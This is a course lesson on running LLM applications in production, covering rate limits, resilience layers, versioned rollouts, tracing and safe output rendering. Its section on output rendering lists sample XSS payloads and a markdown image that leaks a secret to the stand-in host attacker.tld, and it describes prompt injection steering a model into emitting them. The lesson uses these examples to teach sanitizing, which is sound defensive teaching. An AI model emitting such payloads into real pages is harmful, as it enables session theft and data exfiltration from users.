# Day 19 — Deployment, part 2 — reliability, rollout & observability

> [← Day 18](day-18.md) · [All days](README.md) · [Day 20 →](day-20.md)

**Module:** Deployment & Production  ·  **Time:** ~3 hrs

## Where we are

_Continues **Deployment & Production**. Earlier days covered Parts A, B, C; today picks up where they left off._

---

## Part D — Reliability & scale under real traffic

**10. Provider rate limits are the first thing you hit at scale — design for 429s.**
Providers cap you on **RPM (requests/min)** and **TPM (tokens/min)**. Under real concurrency you *will* hit them, and the API returns **429 Too Many Requests** ([Chapter 2](02-apis-and-integration.md) Part E). Naively, that's a user-facing failure. The fixes: **retry with exponential backoff + jitter** ([Chapter 2](02-apis-and-integration.md)), a **request queue** with controlled concurrency so you stay under the limit instead of stampeding it, and **backpressure** (shed or queue load gracefully when saturated rather than melting down).
- *Build consequence:* "It worked in testing" with one user says nothing about 200 concurrent users. Rate limits are a capacity-planning input: know your limits, queue to stay under them, and treat 429 as an expected condition to manage, not a crash.

**11. Retries, fallbacks, timeouts — as architecture, not afterthought (recap → extend).**
[Chapter 2](02-apis-and-integration.md) and [Chapter 7](07-evaluation.md) introduced these per-call; in production they become system policy:
- **Retries with backoff** for transient errors (429, 500, 503, timeouts) — but cap them and make them idempotent.
- **Timeouts** on every provider call — never let a hung request hang a user (or hold a worker) forever.
- **Fallbacks:** a *second* path when the primary fails — a different model, a **different provider** (multi-provider failover), a cached/semantic-cache answer, or graceful degradation ("we're busy, try again"). This is the system-level version of [Chapter 7](07-evaluation.md)'s "reliability is defense in depth."
- *Build consequence:* Assume the provider *will* be slow, rate-limit you, or have an outage — because it will. A production LLM feature has a planned answer for each, so a provider hiccup degrades the experience instead of breaking it.

**12. Keep your backend stateless so you can scale horizontally — state lives elsewhere.**
The API is stateless ([Chapter 2](02-apis-and-integration.md)), and your backend should be too: any server instance can handle any request, so you scale by adding instances behind a load balancer. That means **conversation/session state can't live in a server's memory** (it'd vanish on the next request hitting a different instance) — it lives in a shared store (a database/cache, run in Docker). The message history *you* manage ([Chapter 2](02-apis-and-integration.md)'s "memory is your list") gets persisted and reloaded per request.
- *Build consequence:* Statelessness is what makes scaling easy — but it forces a deliberate decision about *where* conversation state lives. "The bot forgot mid-conversation under load" is almost always session state stuck in one instance's memory instead of a shared store.

---

## Part E — Shipping changes safely (prompts & models are deployable artifacts)

**13. A prompt is a deployable artifact with a version — not a string you edit in place.**
In production, your prompt and your model choice are **configuration you deploy and can roll back**, exactly like code. Each prompt has a version ([Chapter 3](03-prompt-engineering.md)'s templating/versioning), and every logged request records *which* prompt version produced it ([Part F](#part-f--observability--operating-it)). Editing the live prompt by hand, untracked, is the LLM equivalent of editing code directly on the production server.
- *Build consequence:* "Which prompt version is live, what did it score on the eval ([Chapter 7](07-evaluation.md)), and can I roll back instantly?" must always have an answer. Treat prompt changes with the same ceremony as code changes — versioned, eval-gated, reversible.

**14. Rollout patterns: gate, canary, A/B, roll back.**
You never flip a prompt/model change to 100% of traffic on a hope:
- **Eval gate ([Chapter 7](07-evaluation.md)):** the change must pass your offline eval before it goes anywhere. First line of defense.
- **Canary / gradual rollout:** release to a small % of traffic, watch the live metrics ([Part F](#part-f--observability--operating-it)), then ramp. Limits the blast radius of a bad change.
- **A/B test in prod:** run old vs. new on real traffic and compare real outcomes (user signals, quality, cost) when offline eval can't fully predict reception.
- **Instant rollback:** because prompt/model are versioned config, reverting is flipping back to the previous version — fast, and the reason versioning matters.
- *Build consequence:* Offline eval predicts; production *confirms*. Roll out gradually behind metrics so the inevitable surprise hits 1% of users for ten minutes, not everyone for a day.

**15. Provider models change under you — deprecations and silent updates.**
Unlike your own code, the model is a dependency *someone else* controls. Models get **deprecated** (a version you call is retired — you must migrate) and can be **updated** in place (same name, subtly different behavior). Either can shift your system's behavior without a single change on your side.
- *Build consequence:* Pin specific model versions where you can, watch provider deprecation notices, and — the real safeguard — **re-run your eval set ([Chapter 7](07-evaluation.md)) when a model changes**. Your eval suite is exactly what catches "the provider updated the model and our quality dropped" before users do. This is *why* the eval set is permanent infrastructure.

---

## Part F — Observability & operating it

**16. Log every interaction — it's your debugger, your eval-set fuel, and your audit trail.**
For each request, log: the input, the assembled prompt (+ version), the response, **token usage, latency, and cost**, which model, and any guardrail/error events. This one discipline pays off three ways: **debugging** (you can't fix what you can't see — [Chapter 5](05-agents.md)'s tracing, generalized), **eval-set growth** (real failures become eval cases — [Chapter 7](07-evaluation.md)'s flywheel), and **audit** (what did we tell this user, and why).
```python
# A logging wrapper around the provider call — the backbone of observability.
def tracked_call(messages, *, prompt_version, model="claude-sonnet-4-6"):
    t0 = now()
    resp = call_with_retries(model=model, messages=messages)   # Chapter 2 retry logic
    log({
        "prompt_version": prompt_version, "model": model,
        "input_tokens": resp.usage.input_tokens, "output_tokens": resp.usage.output_tokens,
        "cost_usd": cost_of(resp.usage, model), "latency_ms": now() - t0,
        "stop_reason": resp.stop_reason,
    })
    return resp
```
- *Build consequence:* Build logging in from request #1, not after the first incident. The team that logs prompt version + tokens + latency + cost per request can answer almost any production question; the team that doesn't is guessing in the dark during an outage.

**17. The production dashboard — the four metrics + traces, watched continuously.**
Surface what [Chapter 7](07-evaluation.md) Part F named: **quality** (online eval / user signals), **latency** (p50 and p95/p99 — the tail is what users feel), **cost** (per-request and total, trending), and **error/refusal rates**. Add **per-feature traces** (the agent's step trajectory, [Chapter 5](05-agents.md); which chunks RAG retrieved, [Chapter 4](04-rag.md)) for drill-down. A spike in any line is a signal; the trace tells you why.
- *Build consequence:* You optimized these in dev; in prod you *monitor* them, because traffic and the model shift under you. An unwatched cost or latency curve is a bill or an outage you'll learn about from users first.

**18. Alerting, incident response, and the feedback loop.**
Monitoring is passive; **alerting** is monitoring that wakes you up — set thresholds on the four metrics (cost spike, p99 latency, error-rate jump, refusal surge) so you find out before users do. When an incident hits, your logs (concept 16) and traces are the investigation. And close the loop: the failures you find in production flow back into the eval set ([Chapter 7](07-evaluation.md)'s flywheel) so the same bug can't ship twice.
- *Build consequence:* Production isn't "deploy and walk away" — it's a loop: monitor → alert → investigate via logs → fix → add to eval → redeploy. The eval set you launch with is the worst it'll ever be precisely because production keeps feeding it.

**19. Secrets and access at the system level — named, per program scope.**
The key never lives in client code or the repo; it's injected from the environment / a secret manager into your backend only (concept 1). Beyond the provider key: authenticate *your* users, rate-limit *per user* (so one client can't exhaust your provider quota or your budget), and don't log secrets or raw PII ([Chapter 7](07-evaluation.md)). Deep secret-management mechanics are out of scope for this program — the principle is what matters: **keys server-side only, per-user limits, no secrets in logs.**
- *Build consequence:* Treat your provider key like a production database password — server-side, injected, never committed, never logged. A leaked key is someone else spending your money; per-user rate limits are what stop one abuser from running up the bill for everyone.

---

## Part G — Tracing with spans, and shadow-mode rollout

**20. Promote the flat log into a trace: one request = a parent span with nested child spans.**
[Part F](#part-f--observability--operating-it)'s `tracked_call` (concept 16) logs *one row per model call* — fine for a single-shot request, useless for a multi-step RAG or agent request where the interesting question is *which step*. Promote it to a **trace**: the request becomes a **parent span**, and each sub-step — every retrieval, every tool call, every model call — becomes a **child span** nested under it, each timed and attributed on its own. Now a slow or wrong multi-step request is debugged **by step**: you open the trace and read *which child span burned the latency* and *which retrieval returned the junk chunk*. A flat log can only tell you the whole request was slow or wrong; it can't point at the step, so you're back to guessing.
- *Build consequence:* The moment a request has more than one model/retrieval/tool hop (every RAG bot, every agent), flat logs stop being enough — you need the span tree. Same data you already log (concept 16), restructured as a parent-with-children so latency and failure are attributable to a step instead of a request.

**21. The vendor-neutral standard: OpenTelemetry GenAI semantic conventions.**
Don't invent your own span schema — emit the **OpenTelemetry (OTel) GenAI semantic conventions**, the 2026 vendor-neutral standard for LLM traces, so any backend can read them. Span types you'll emit: **inference** (a model call), **embeddings**, **retrieval**, and **execute_tool**. Core attributes on each: `gen_ai.operation.name`, `gen_ai.request.model`, `gen_ai.usage.input_tokens` / `gen_ai.usage.output_tokens`, and `gen_ai.response.finish_reasons` — which are *exactly* [Part F](#part-f--observability--operating-it)'s existing log fields (model, tokens, stop reason) renamed and hung on a span tree instead of flattened into a row. Note these conventions are **still maturing as of 2026** (attribute names and the content-capture model are not fully frozen) — adopt them, but pin your instrumentation version and expect minor churn.
- *Build consequence:* Instrument once to a standard, not to a vendor. Because the attributes *are* your concept-16 fields, the migration from flat logging to OTel spans is restructuring, not rewriting — and it keeps you free to switch backends without re-instrumenting.

**22. Backends that speak this without adopting an orchestration framework.**
You do *not* need to rewrite onto a framework to get traces — these read OTel/GenAI spans (or drop in even more cheaply):
- **Langfuse** — open-source, self-hostable in Docker; the common default for owning your trace data.
- **Arize Phoenix** — open-source, strong on evals and drift detection alongside tracing.
- **LangSmith** — managed, rich trace UI.
- **Helicone** — a drop-in **proxy**: change one base URL and you get logging/tracing with zero code instrumentation.
- **OTel collector** — route spans to whatever you already run.
- *Build consequence:* Tracing is an *additive* layer, not a framework migration. The cheapest start is a proxy (one base-URL change); the most control is self-hosted Langfuse/Phoenix in Docker. Either way you keep the architecture from Parts A–D — you're only changing where the spans land.

**23. Shadow mode — replay live traffic through the candidate, score it, never show a user.**
Concept 14's ladder went eval-gate → canary, but canary still puts the change in front of *real users* at 1%. **Shadow mode** closes that gap: **duplicate** live traffic and replay it through the new prompt/model version *in parallel*, score the shadow output with your online judge (concept 17 / [Chapter 7](07-evaluation.md)), and **never return it to the user** — the user only ever sees the current production version. It's the safest pre-canary validation because a bad candidate is scored, not served. Motivation: as of 2026, **prompt updates cause most LLM production incidents** — so shadow + canary matter for **prompt changes as much as model changes**; the prompt is where the regressions actually come from (concept 13). Extend the rollout ladder to: **eval-gate → shadow → canary 1% → 5% → 20% → 50% → 100% → instant rollback** (concept 14).
- *Build consequence:* Before a single user touches a new prompt/model, you already have real-traffic judge scores for it from shadow mode — go/no-go on evidence, not hope. Offline eval predicts on a fixed set ([Chapter 7](07-evaluation.md)); shadow confirms on *live* traffic with *zero* user risk; canary then confirms on real outcomes. Shadow is the rung that makes the inevitable prompt regression a logged non-event instead of an incident.

> The *running-in-production* loop these spans and scores feed — drift detection, online evaluation, turning feedback into eval cases, and incident triage — is deepened in the **Monitoring, Drift & Continuous-Improvement** extension chapter. This Part gets you emitting the traces and running shadow; that chapter operates on them over time.

---

## Part H — Concurrency & throughput; safe output rendering

Two things that don't break in a notebook and break the *moment* you have real users — gathered here because both live at the **request boundary**. The first **deepens** "parallelize independent calls" ([Part B](#part-b--latency-making-it-feel-fast) concept 6) and the RPM/TPM/429 material ([Part D](#part-d--reliability--scale-under-real-traffic) concept 10) into *measured* **throughput**; the second **extends** Chapter 7's output-guardrail stance from "is the content safe?" to "is it safe to *render*?" — the output surface itself. It does **not** re-cover per-call latency (TTFT/total — [Part B](#part-b--latency-making-it-feel-fast)) or authentication/keys ([Part A](#part-a--the-shape-of-an-llm-application-in-production)); it consumes those and builds on top.

Picture a restaurant kitchen. One dish takes as long as it takes — that's **per-call latency**, fixed by the recipe (the provider), and no amount of cleverness in your code shortens it. But **dinners served per hour** depends on two other things: how many **burners you run at once** (your concurrency) *and* the capacity of the **gas line** feeding them (your provider's TPM). Light every burner you own and the gas line can't keep up — every flame sputters and nothing cooks. That sputter is a **429 storm**: maximize concurrency blindly and you stampede the rate limit until *every* request is failing and retrying. Throughput is therefore a **bounded** concurrency problem — as many burners as the gas line sustains, and not one more.

**24. A request's latency is fixed by the provider; your *service's* throughput is set by concurrency — within a request and across requests.**
Two different clocks, and beginners conflate them. **Latency** is how long *one* request takes (Part B — dominated by the provider call, you can't beat it by much). **Throughput** is how many requests your *service* completes per unit time — and that you control. It splits into two scopes:

- **Within one request — parallel fan-out.** [Part B](#part-b--latency-making-it-feel-fast) concept 6 said "fire independent calls concurrently"; here it's measured. Three *independent* calls (say a retrieval, a classification, and a summary that don't depend on each other) awaited in a row cost `t1 + t2 + t3`. A **parallel fan-out** — `asyncio.gather` / a thread pool — runs them at once so wall-clock collapses to `max(t1, t2, t3)`, the *slowest leg*, not the sum.
  ```python
  # SERIAL — three independent calls, ~0.6s each → ~1.8s wall-clock (each awaits the previous)
  ctx   = await retrieve(q)        # ~0.6s
  label = await classify(q)        # ~0.6s   none of these depends on another's result
  gist  = await summarize(q)       # ~0.6s
  # total ≈ 1.8s — you paid the sum

  # PARALLEL fan-out — same three calls, dispatched together → wall-clock ≈ max(...) ≈ 0.6s
  ctx, label, gist = await asyncio.gather(retrieve(q), classify(q), summarize(q))
  # total ≈ 0.6s — you paid the slowest leg. 3× faster, identical work.
  ```
  The OpenAI equivalent is the same shape (`asyncio.gather` over `await client.chat.completions.create(...)`); for a sync SDK, a `concurrent.futures.ThreadPoolExecutor` collapses the same three blocking calls. The rule: *only fan out calls that don't depend on each other* — a step that needs the previous step's output stays serial.

- **Across requests — requests/sec and tokens/sec, not per-call latency.** Stack 100 user requests on the service and the binding constraint is no longer any one call's latency — it's the provider's **RPM (requests/min)** and **TPM (tokens/min)** ceiling ([Part D](#part-d--reliability--scale-under-real-traffic)). So the number that tells you whether you'll survive launch is **requests/sec and tokens/sec sustained**, not the p50 of a single call. A service where each call is a snappy 600 ms can still fall over at 50 concurrent users if that's 200 calls/sec into a 100-call/sec limit.
- *Build consequence:* Profile two different things. For *one user feeling slow*, optimize latency (Part B). For *the service under load*, measure sustained **requests/sec and tokens/sec** against your RPM/TPM, and fan out every set of independent calls so each request's wall-clock is its slowest leg. The anti-pattern is reporting only per-call latency and being blindsided when the service melts at 30 users.

**25. Throughput is *bounded* concurrency (a semaphore sized to your TPM), not "fire everything at once."**
The naive next move after discovering `gather` is to fan out *everything* — dispatch all 100 in-flight requests' provider calls simultaneously. That's the **fire-everything-in-parallel** anti-pattern, and it stampedes the rate limit: you blow past TPM, the provider returns **429 Too Many Requests** to a large fraction of calls at once (a **429 storm**), they all back off and retry *together*, re-stampede, and your effective throughput *collapses* below what an orderly queue would have sustained. More concurrency past the limit makes you *slower*, not faster.

The fix is **bounded concurrency**: cap the number of simultaneous provider calls with a **semaphore** (a counter that admits at most *N* holders at once; the *N+1*th waits for a slot) or an equivalent worker pool, with *N* sized to keep you *under* your TPM/RPM rather than crashing into it.
```python
# A semaphore caps in-flight provider calls at N. Size N to your TPM, not to "as many as possible".
sem = asyncio.Semaphore(8)          # at most 8 concurrent provider calls (tune to your rate limit)

async def bounded_call(messages):
    async with sem:                 # the 9th caller blocks here until a slot frees — no stampede
        return await call_with_retries(messages)   # Part D retry/backoff still wraps each call

# 100 incoming requests now drain through 8 slots at a sustained rate, instead of 100 simultaneous 429s.
results = await asyncio.gather(*(bounded_call(m) for m in hundred_requests))
```
Worked contrast: **100 concurrent unbounded** calls into a limit that sustains ~8 → most return 429, the retry-storm thrashes, and goodput craters. The **same 100 through a pool of 8** drain steadily at the provider's sustainable rate — higher *real* throughput, no storm, predictable latency. (`call_with_retries` from Part D still wraps each call: the semaphore prevents the storm, retries handle the occasional 429 that slips through.)
- *Build consequence:* Put every provider call behind a **bounded** concurrency primitive (a semaphore / worker pool / queue) sized to your TPM, and treat 429-rate as a tuning signal — climbing 429s means *lower* N, not "add more workers." Bounded concurrency is the burner count your gas line can actually feed.

**26. Model output is untrusted text headed for a UI — rendering it raw is an injection sink.**
Chapter 7's guardrails asked *is the content acceptable?* This is a different question at a different layer: *is it safe to **render**?* The model's output is a string you did not write — and a model (or an **indirect injection** that steered it — [Chapter 4](04-rag.md) Part I) can emit markup that *acts* when displayed. Drop it into a web page or a downstream system raw and it's an **injection sink**:
- `<script>steal(document.cookie)</script>` or `<img src=x onerror="exfiltrate()">` → **XSS** (cross-site scripting: attacker JavaScript running in your user's browser, in your origin).
- `[click here](javascript:stealSession())` → a `javascript:` link that runs code on click.
- `![status](https://attacker.tld/log?d=SECRET)` → a markdown image whose URL **exfiltrates** data the moment the client auto-loads it — no click required.
- a SQL-ish or shell-ish string handed to a downstream interpreter → injection one layer further down.

The stance: **model output is user-generated content (UGC)** — content from an untrusted source — and you treat it exactly as you'd treat a comment a stranger typed into your site. You never render UGC raw. You **sanitize/escape on the way out**: HTML-escape so `<script>` becomes inert text (`&lt;script&gt;`), and **allowlist-render** the few constructs you intend to support (e.g. plain links and images whose URLs match an `https://`-to-known-hosts allowlist; strip `javascript:`/`data:` schemes and event-handler attributes).
```python
import html
# RAW — the sink. The browser executes the onerror handler; the exfil image fires on load.
page = f"<div>{model_output}</div>"                      # XSS / data-exfil live here

# ESCAPED — model output rendered as inert text; markup shows literally, executes never.
page = f"<div>{html.escape(model_output)}</div>"         # <script> → &lt;script&gt;, harmless
# If you must render markdown, run it through a sanitizer with an allowlist (e.g. bleach / DOMPurify):
#   allow a, img, code, ... ; allow href/src only on an https:// host allowlist; drop javascript:/data:/on*.
```
- *Build consequence:* Sanitize/escape model output at the **rendering boundary**, every time, and allowlist-render rather than blocklist. The anti-pattern is *output-is-trusted-because-it's-our-model* — it is not yours; it is UGC the moment a prompt, a tool result, or a retrieved chunk can influence it, and the render layer is the last place to make it inert.

---

## Part I — Resilience: retries, timeouts, circuit breakers, provider fallback

[Part D](#part-d--reliability--scale-under-real-traffic) listed retries, timeouts, and fallbacks "as architecture" (concept 11) and named 429/RPM/TPM (concept 10). This Part turns that list into a **working, ordered stack** and adds the piece Part D left out: the **circuit breaker**. It **deepens** concept 11's retry/timeout/fallback into an *ordered* wrapper around a provider call and **adds** the breaker; it does **not** re-cover the per-call error types (429/500/503 — [Chapter 2](02-apis-and-integration.md) Part E) or rate-limit basics ([Part D](#part-d--reliability--scale-under-real-traffic)) — it assumes those and composes them.

Think of building **fire safety** into a building, layer by layer. A **smoke detector** tells you *fast* that something's wrong instead of waiting until the room is full — that's your **timeout**: don't wait forever to notice a call has hung. If a door sticks you **try it a few times** before giving up, but you don't pound it down — that's **retry with backoff**: a transient blip deserves a second try, not infinite hammering. The **automatic gas/sprinkler shutoff** stops feeding a fire that's clearly established — that's the **circuit breaker**: when a dependency is *down*, stop sending it traffic at all. And the **marked exit** is the planned worse-but-working path out — that's the **fallback**: when everything else fails, degrade gracefully instead of showing an error page. Each layer fixes exactly what the one before it can't.

**27. The four layers, in order, around a single provider call.**
Resilience isn't one trick; it's four, composed in a specific order around each provider call. Derive the order from what each fixes that the previous can't:

1. **Timeout** — a hard cap on how long you'll wait for a response. *Fixes:* a hung call holding a worker forever. *Can't fix:* anything — it just stops you hanging; the call still **fails**. Never make a provider call without one.
2. **Retry with exponential backoff + jitter** — on *transient* errors (429, 500, 503, timeout), wait a growing interval (1s, 2s, 4s…) with a random **jitter** added (so 100 clients retrying don't sync up into a fresh stampede), then try again — **capped** (e.g. 3 attempts) and only for **idempotent** calls. *Fixes:* a momentary blip — one bad call out of a healthy stream. *Can't fix:* a real outage — if the provider is *down*, every retry also fails, so retries turn one slow call into a **retry-storm** that piles up latency.
3. **Circuit breaker** — watches the failure rate across calls; after *N* consecutive failures it **trips** (opens) and, for a **cooldown** window, **fails fast** — returning immediately without even attempting the provider. After the cooldown it goes **half-open**, lets *one* probe through, and **closes** (resumes normal traffic) if the probe succeeds or re-trips if it fails. *Fixes:* the retry-storm — it stops you hammering a dependency that's clearly dead. *Can't fix:* the user still needs an answer.
4. **Fallback** — when the call fails fast (or exhausts retries), serve an alternate: a **different model / provider** (multi-provider failover), a **semantic-cache** answer ([Part C](#part-c--cost-at-scale-the-bill-is-now-a-system-property) concept 9), or **graceful degradation** — a planned, worse-but-working response ("we're briefly unable to do X; here's Y"). *Fixes:* turning "fail fast" into "still serve something useful."

```python
# Provider-AGNOSTIC wrapper: the same four layers wrap ANY client call. Swap the client to swap providers.
@breaker(fail_max=5, cooldown=30)            # trips after 5 failures; fails fast for 30s; then half-open probe
@retry(max_attempts=3, backoff=expo, jitter=full,   # capped backoff+jitter on transient errors only
       retry_on=(RateLimit, ServerError, Timeout))
def call_model(messages, *, client, model, timeout=20):
    return client.create(model=model, messages=messages, timeout=timeout)   # timeout on EVERY call

def answer(messages):
    try:
        return call_model(messages, client=anthropic_client, model="claude-sonnet-4-6")
    except (CircuitOpen, ProviderError):     # breaker tripped OR retries exhausted → take the marked exit
        try:
            return call_model(messages, client=openai_client, model="gpt-4.1")   # multi-provider failover
        except ProviderError:
            return DEGRADED   # graceful degradation: a planned worse-but-working answer, logged as a non-event
```
> **Setup assumed:** API keys for each provider come from the environment / a secret manager (concept 19), never hardcoded; `client` is a thin adapter so both providers expose one `create(...)` signature ([Part A](#part-a--the-shape-of-an-llm-application-in-production)'s backend boundary). `@breaker`/`@retry` here are illustrative decorators — in practice use a maintained library (e.g. `tenacity` for retry, `pybreaker`/`purgatory` for the breaker) rather than hand-rolling.

- *Build consequence:* Wrap every provider call in **all four**, in this order — timeout inermost, then retry, then breaker, then fallback at the call site. Drop any layer and a specific failure mode goes unhandled: no timeout → hung workers; no retry → blips become user errors; no breaker → outages become retry-storms; no fallback → fail-fast becomes a blank error page.

**28. The circuit breaker is the missing piece — it converts "dog-pile a dead dependency" into "fail fast."**
Retries alone are a trap at scale. A retry assumes the failure is a *blip on one call*; an **outage** is a *sustained failure across many calls*. When the provider is hard-down, **retries make it worse**: every request retries 3× against a dead endpoint, each waiting out its backoff, so latency piles up and you effectively **DDoS your own dependency** (and burn your worker pool waiting). The **circuit breaker** is the layer that distinguishes the two: it watches failures *across* calls, and once enough pile up it **trips** and **fails fast** for a cooldown — subsequent calls return in *milliseconds* (straight to the fallback) instead of timing out for *seconds* each. Then a single **half-open** probe checks whether the provider recovered before resuming full traffic, so you don't flap.

This is also where **graceful degradation** earns its name: it is a *planned* worse-but-working answer — a cached result, a simpler non-LLM response, an honest "this feature is briefly unavailable, here's what I can still do" — **not** an unhandled exception rendered as a 500 page. The difference between "degraded" and "broken" is whether you wrote the fallback path *on purpose*.
- *Build consequence:* Add a breaker around any dependency that can have a *sustained* outage (every provider can). Retries and the breaker **stack** — they are not alternatives: retries absorb the one-off blip, the breaker stops the storm when blips become an outage. Without the breaker, your resilience layer becomes the *cause* of the incident.

**29. Prove the resilience path by *firing* it — you don't trust a failover you've never triggered.**
A resilience stack you've never exercised is a *hope*, not a guarantee — and the day it's supposed to fire is the worst time to discover the fallback throws its own exception. So **force** each failure deliberately and watch the stack degrade end to end. Point the client at a **stub** you control (run it in Docker) that you can make misbehave on demand — return 429s, hang past the timeout, or refuse all connections (hard-down) — and narrate the three cases:

- **(a) One transient 429.** The stub 429s once, then succeeds. The **retry**'s backoff waits and re-issues; the second attempt succeeds; **the user never notices**. The breaker sees one failure (below its threshold), stays closed.
- **(b) Provider hard-down.** The stub refuses everything. The first few calls fail and retry (briefly), the **breaker trips** after *N* failures, and *every subsequent call* **fails fast in milliseconds** straight to the **fallback model/provider** — no more multi-second timeouts piling up. The user gets a slightly different but correct answer from the secondary provider.
- **(c) Everything down.** Primary and fallback both refuse. The stack exhausts its options and returns the **graceful-degradation** message — logged as a **non-event** (an expected, handled state), not paged as an outage.

One sentence to keep straight what handled what: the **retry** silently absorbed the *blip on one call* in (a); the **circuit breaker** absorbed the *sustained outage across calls* in (b) by failing fast to the fallback — same dependency failing, two different time-scales, two different layers.
- *Build consequence:* A **forced-failure test** (stub that 429s, hangs, and hard-downs) proving transient-retry / breaker-trips-fast / degrades-gracefully — each event logged — is part of Definition of Done for any production provider call. Resilience you haven't fired is resilience you don't have.

---

---

## Module wrap-up — hands-on, questions & deliverable

**Resources**
- Anthropic & OpenAI — rate-limit docs (RPM/TPM), prompt-caching guides, batch API docs, streaming docs, and model-deprecation/versioning pages.
- A read on **load balancing / horizontal scaling** and **canary/gradual rollouts** at the concept level (general backend ops, applied to an LLM service).
- Your own earlier chapters: [Chapter 2](02-apis-and-integration.md) (errors/retries/streaming/cost), [Chapter 3](03-prompt-engineering.md) (caching/templating), [Chapter 4](04-rag.md) (RAG hops), [Chapter 5](05-agents.md) (agent steps/latency), [Chapter 7](07-evaluation.md) (metrics, eval gate, reliability) — this section operationalizes all of them.

**Hands-on tasks**
1. **Wrap it in an endpoint:** put your [Chapter 4](04-rag.md) RAG bot or [Chapter 5](05-agents.md) agent behind a small HTTP endpoint (any framework). Client sends a question, your backend does the work and responds — key stays server-side.
2. **Stream it:** convert the endpoint to stream tokens. Compare the *felt* speed against the synchronous version on a long answer.
3. **Log every call:** add the `tracked_call` wrapper — log prompt version, model, tokens, cost, latency, stop reason — for each request. Print a summary after 10 requests.
4. **Estimate the bill:** from your logs, compute average cost/request, then project monthly cost at 1k, 100k, and 1M requests/day. Write the number down.
5. **Add a cost lever:** apply one — structure the prompt for caching, route easy cases to a smaller model, or trim retrieved context — and measure the per-request cost change against your eval (did quality hold?).
6. **Survive a 429:** simulate rate-limit/transient errors and confirm your retry+backoff+timeout+fallback path degrades gracefully instead of erroring to the user.
7. **Version + roll back:** tag two prompt versions, record which produced each logged response, and demonstrate switching back to the previous version (a config flip, not a code rewrite).
8. *(Stretch)* **Semantic cache:** cache answered questions by embedding; serve a cached answer when a new question is similar enough. Measure the cache-hit rate and name one question you'd *refuse* to cache.
9. **Trace it by step:** instrument the Chapter 8 endpoint to emit a **parent span per request** with **child spans** for retrieval and the model call (OTel GenAI attribute names — `gen_ai.request.model`, `gen_ai.usage.input_tokens`/`output_tokens`, `gen_ai.response.finish_reasons` — or a Langfuse/Phoenix SDK self-hosted in Docker). Run a few multi-step requests, pull up **one trace**, and read off *which span dominated latency* and *which chunks retrieval returned*.
10. **Shadow a second prompt version:** capture a batch of real requests, then **replay** them through a second prompt version *in parallel with* production — score both versions' outputs with your online judge and log the scores side by side, **without exposing the shadow output to any user**. Make a go/no-go call on the candidate from the side-by-side scores alone.
11. **Parallel fan-out + throughput ([Part H](#part-h--concurrency--throughput-safe-output-rendering)):** take a Chapter-8 request that makes several *independent* calls (e.g. retrieve + classify + summarize). Convert the **sequential awaits** to a **parallel fan-out** (`asyncio.gather` / a thread pool) and measure **wall-clock before vs after** (expect ≈ sum → ≈ slowest leg, e.g. ~1.8s → ~0.6s for three ~600ms calls). Then drive the endpoint with a load of concurrent requests and measure **requests/sec and tokens/sec**.
12. **Bound the concurrency ([Part H](#part-h--concurrency--throughput-safe-output-rendering)):** fire an **unbounded burst** of provider calls (e.g. 100 at once) against your rate limit and watch the **429 storm** crater goodput. Then put the calls behind a **semaphore / worker pool** sized to your TPM and show the **bounded pool sustains throughput** with no storm. Report sustained requests/sec for both, and the N you settled on.
13. **Safe output rendering ([Part H](#part-h--concurrency--throughput-safe-output-rendering)):** take a model output carrying an injected `<script>` / `<img onerror=...>` / `[link](javascript:...)` / exfil-image markdown. **Render it raw** to confirm the sink fires (in a sandbox, never a real user). Then add an **output sanitizer** (HTML-escape + a link/image-URL **allowlist**, e.g. `bleach`/DOMPurify) and confirm the same output renders **inert** (markup shown literally, no execution).
14. **The full resilience stack ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)):** wrap a single provider call in all four layers — **timeout**, **capped backoff+jitter retries**, a **simple circuit breaker**, and a **fallback** (alternate model/provider behind one interface, keys from env). Keep it provider-agnostic so swapping the client swaps the provider.
15. **Force the failures ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)):** point the call at a **stub in Docker** you can make misbehave, and prove the stack end to end: (a) a **transient 429** is silently **retried to success** (user never notices); (b) a **sustained outage trips the breaker** → calls **fail fast in ms** to the fallback model instead of timing out for seconds each; (c) **everything down** returns a **degraded-but-working** response, each event **logged**. Write **one sentence** distinguishing what the *retry* handled vs what the *breaker* handled.

**Questions**

*Check understanding*
1. Why must the provider call happen in your backend and never in the client?
2. Trace the standard production request path and name where [Chapter 4](04-rag.md) (RAG) and [Chapter 7](07-evaluation.md) (guardrails) slot in.
3. When do you use synchronous vs. streaming vs. a background job?
4. In a typical LLM feature, what dominates latency, and what are TTFT and total latency?
5. Why does streaming improve *perceived* latency even though total time is unchanged?
6. Give the formula for per-request cost and explain why a "cheap" feature can produce a huge bill.
7. Name three cost levers and one line on how each saves money.
8. What are RPM/TPM, what status code signals you hit them, and what's the response?
17. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) Distinguish **latency** from **throughput**: which is fixed by the provider, and which does your service control?
18. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) Why is model output treated as **UGC**, and what does rendering it raw risk (name the attack)?
19. ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)) Name the four resilience layers in order, and what a **circuit breaker** does when it **trips**.

*Apply it*
9. Your agent takes ~40 seconds per run. Which delivery pattern fits, and why is a synchronous endpoint wrong?
10. A prompt change passed offline eval. How do you roll it out to avoid a site-wide regression, and how do you undo it if it's bad?
11. Under load, users report the bot "forgets" mid-conversation. What's the likely cause given horizontal scaling?
12. The provider updated the model behind the name you call and quality dropped. What safeguard catches this, and what should you have done to prevent it?
13. Per-request cost tripled the day after a deploy. How does your logging let you find the cause fast?
20. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) One request makes three independent ~600ms model/retrieval calls awaited in sequence. What's the wall-clock, how do you cut it, and to what?
21. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) A teammate "fixes" slow throughput by firing all 100 in-flight requests' provider calls at once and 429s explode. What's the actual fix, and how do you size it?
22. ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)) The provider goes hard-down and your retry-only stack makes latency *worse*. Why, and which layer fixes it?

*Stretch*
14. Design the reliability layer for a high-traffic feature: list every failure mode (429, timeout, 5xx, provider outage) and the architectural response to each.
15. You want to cut cost 50% without hurting quality. Lay out the levers you'd try, in order, and how your eval set tells you when you've gone too far.
16. Explain why prompts and model choices are "deployable artifacts" and what production capabilities (gate, canary, rollback) that framing unlocks.
